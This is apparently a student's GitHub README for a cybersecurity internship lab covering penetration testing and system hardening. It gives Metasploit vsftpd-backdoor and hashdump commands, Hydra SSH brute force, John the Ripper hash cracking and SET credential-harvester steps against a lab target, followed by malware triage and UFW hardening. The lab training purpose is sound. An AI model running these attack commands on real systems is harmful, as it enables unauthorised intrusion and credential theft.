# 💥 Task 4 — Exploitation \& System Security

> \*\*ApexPlanet Cybersecurity Internship | Days 37–48\*\*

!\[Task](https://img.shields.io/badge/Task-4-blue)
!\[Track](https://img.shields.io/badge/Track-Exploitation%20%26%20System%20Security-red)
!\[Status](https://img.shields.io/badge/Status-In%20Progress-orange)

\---

## 📌 Objective

Learn penetration testing workflow and **exploit vulnerabilities responsibly** using Metasploit, Hydra, John the Ripper, and system hardening techniques.

\---

## 🛠️ Tools Used

|Tool|Purpose|
|-|-|
|`Metasploit / msfconsole`|Exploitation framework|
|`Hydra`|SSH brute force|
|`John the Ripper`|Password hash cracking|
|`UFW`|Firewall configuration|
|`strings / file`|Static malware analysis|
|`Cuckoo / Any.run`|Dynamic sandbox analysis|
|`SET (Social Engineering Toolkit)`|Phishing simulation|

\---

## 🔴 Penetration Testing Phases

```
Recon → Scanning → Exploitation → Post-Exploitation → Reporting
```

|Phase|Tools Used|Output|
|-|-|-|
|Recon|Nmap, Whois, Shodan|Target info gathered|
|Scanning|Nmap -sV -A, OpenVAS|Open ports, CVEs identified|
|Exploitation|Metasploit, vsftpd exploit|Reverse shell obtained|
|Post-Exploitation|sysinfo, hashdump, ps|System data extracted|
|Reporting|This document + GitHub|Full documented report|

\---

## 📋 Steps Completed

### 1\. 💥 Exploitation with Metasploit

```bash
# Launch Metasploit
msfconsole

# Search and use vsftpd backdoor exploit
search vsftpd
use exploit/unix/ftp/vsftpd\_234\_backdoor
set RHOSTS \[target-ip]
run

# Post-exploitation commands (inside meterpreter/shell)
sysinfo
hashdump
getuid
ps
```

### 2\. 🔑 Password Attacks

#### Hydra — SSH Brute Force

```bash
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://\[target-ip]
hydra -L users.txt -P passwords.txt ssh://\[target-ip] -t 4 -V
```

#### John the Ripper — Hash Cracking

```bash
# Save hashes from hashdump
echo 'hash\_here' > hashes.txt

# Crack with wordlist
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Show results
john hashes.txt --show
```

### 3\. 🎭 Social Engineering (Simulation Only)

```bash
# Launch SET
sudo setoolkit

# Choose:
# 1) Social Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack
```

> ⚠️ Simulation only — never use against real targets without authorization.

### 4\. 🦠 Malware Analysis

```bash
# Static Analysis
file malware\_sample
strings malware\_sample | head -50
md5sum malware\_sample
sha256sum malware\_sample

# Check on VirusTotal (online)
# Upload hash to: virustotal.com

# Dynamic Analysis — use Cuckoo Sandbox or Any.run
```

### 5\. 🛡️ System Hardening

```bash
# Apply patches
sudo apt update \&\& sudo apt upgrade -y

# Configure UFW firewall
sudo ufw enable
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 22/tcp
sudo ufw status verbose

# Disable unused services
sudo systemctl disable telnet
sudo systemctl disable vsftpd
sudo systemctl disable rsh

# Check for SUID files (privilege escalation risk)
find / -perm -4000 -type f 2>/dev/null

# Check open ports after hardening
ss -tuln
```

\---

## 📁 Repository Structure

```
Task-4/
├── README.md                          ← This file
├── Lab\_Report\_Task4\_Exploitation.docx
├── Task4\_VideoScript\_LinkedIn.md
├── pentest-notes/
│   ├── metasploit-commands.md
│   ├── password-attacks.md
│   └── system-hardening.md
└── screenshots/
    ├── metasploit-shell.png
    ├── post-exploitation-hashdump.png
    ├── hydra-ssh-crack.png
    ├── john-cracked-passwords.png
    ├── phishing-page-simulation.png
    ├── malware-static-analysis.png
    ├── ufw-firewall-status.png
    └── disabled-services.png


